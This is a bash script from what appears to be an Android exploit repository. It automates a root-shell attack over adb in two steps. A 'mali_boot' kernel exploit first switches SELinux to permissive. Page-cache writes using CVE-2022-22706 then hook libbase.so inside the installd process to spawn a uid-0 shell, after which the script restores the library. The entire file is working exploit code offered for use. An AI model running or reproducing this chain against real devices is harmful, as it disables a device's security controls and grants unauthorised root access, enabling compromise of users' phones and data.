#!/usr/bin/env bash
# rootshell.sh -- bring up the uid-0 installd command channel and enter it.
#
#   channel/rootshell.sh                 # flip SELinux permissive, then shell
#   SKIP_SWITCH=1 channel/rootshell.sh   # channel only (MAC already off)
#   channel/rootshell.sh '<cmd>'         # one-shot: run <cmd> in the root shell
#
# Two per-boot primitives, in this order:
#   1. SELinux permissive  -- `mali_boot switch` (policydb.permissive_map +
#      AVC eviction; docs/routes/SELINUX-SWITCH.md).  Kernel memory only.
#   2. uid-0 / u:r:installd:s0 -- CVE-2022-22706 page-cache hook in
#      /system/lib64/libbase.so (GetBoolProperty -> payload -> sh r.sh).
#      The hook page is restored as soon as the channel is up; the channel
#      itself lives until it is killed or the device reboots.
#
# With both up, the channel is unrestricted: it reads /dev/kmsg, enumerates
# /dev/block/by-name, etc. -- things installd was MAC-denied with MAC on.
set -u
REPO=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
SER=${SER:-0123456789ABCDEF}
D=/data/local/tmp
LIB=/system/lib64/libbase.so
A="adb -s $SER"
X=$REPO/channel

say() { printf '[rootshell] %s\n' "$*"; }

# 1. SELinux permissive (skip if already done this boot)
if [ "${SKIP_SWITCH:-0}" != 1 ]; then
  say "1/2 SELinux permissive (mali_boot switch)"
  "$REPO/tools/devlock.sh" 900 rootshell-switch -- \
      "$REPO/tools/pocrun.sh" -b "$REPO/exploit/mali_boot" \
      -n mbsw -a switch -t 400 -T rootshell-switch >/dev/null 2>&1 || true
  R=$(ls -t "$REPO"/runs/*rootshell-switch/dev.log \
      2>/dev/null | head -1)
  if [ -n "${R:-}" ] && grep -q "MAC GRANTED" "$R"; then
    say "   SELinux permissive: OK ($R)"
  else
    say "   WARNING: no 'MAC GRANTED' in the switch run; continuing"
  fi
fi

# 2. installd channel
say "2/2 uid-0 installd channel"
$A pull "$LIB" /tmp/rootshell-libbase.so >/dev/null 2>&1 || {
  say "cannot pull $LIB"; exit 1; }
PID=$($A shell pidof installd | tr -d '\r')
[ -n "$PID" ] || { say "installd not running"; exit 1; }
( cd "$X" && ./build_libhook.sh /tmp/rootshell-libbase.so 0xe6f4 0x10418 \
    0xe6f8 "$PID" || exit 1 ) || { say "build_libhook failed"; exit 1; }
dd if=/tmp/rootshell-libbase.so of=/tmp/rs_T.bin bs=1 skip=$((0xe6f4)) \
    count=4 status=none
dd if=/tmp/rootshell-libbase.so of=/tmp/rs_H.bin bs=1 skip=$((0x10418)) \
    count=1024 status=none
$A push "$X/hook_payload.bin" $D/hook_payload.bin >/dev/null 2>&1
$A push "$X/hook_branch.bin"  $D/hook_branch.bin  >/dev/null 2>&1
$A push /tmp/rs_T.bin $D/lb_T_orig.bin >/dev/null 2>&1
$A push /tmp/rs_H.bin $D/lb_H_orig.bin >/dev/null 2>&1
$A shell "rm -f $D/hits" >/dev/null 2>&1
$A shell "$D/pcwrite2 $LIB 0x10418 $D/hook_payload.bin" >/dev/null 2>&1
$A shell "$D/pcwrite2 $LIB 0xe6f4  $D/hook_branch.bin"  >/dev/null 2>&1
$A shell 'cmd package compile -m speed -f com.neutronized.supercattales2' \
    >/dev/null 2>&1

# wait for the loops, then keep exactly one (the hook fires per cold call)
LOOPS=""
for _ in $(seq 1 30); do
  LOOPS=$($A shell 'for p in /proc/[0-9]*; do c=$(tr "\0" " " < $p/cmdline 2>/dev/null); case "$c" in "sh /data/local/tmp/r.sh"*) echo ${p#/proc/};; esac; done' 2>/dev/null | tr -d '\r')
  [ -n "$LOOPS" ] && break
  sleep 1
done
[ -n "$LOOPS" ] || { say "hook did not fire (retry after a reboot)"; exit 1; }
KEEP=$(printf '%s\n' $LOOPS | head -1)
EXTRAS=$(printf '%s\n' $LOOPS | grep -v "^$KEEP\$" | tr '\n' ' ')
[ -n "${EXTRAS// /}" ] && "$X/channel.sh" "kill -9 $EXTRAS" >/dev/null 2>&1

# put the library back as soon as the channel exists
$A shell "$D/pcwrite2 $LIB 0xe6f4  $D/lb_T_orig.bin" >/dev/null 2>&1
$A shell "$D/pcwrite2 $LIB 0x10418 $D/lb_H_orig.bin" >/dev/null 2>&1
say "channel pid $KEEP up (uid 0, u:r:installd:s0); libbase restored"
[ "$#" -gt 0 ] && exec "$REPO/channel/rootcmd.sh" "$*"
exec "$REPO/channel/rootcmd.sh"
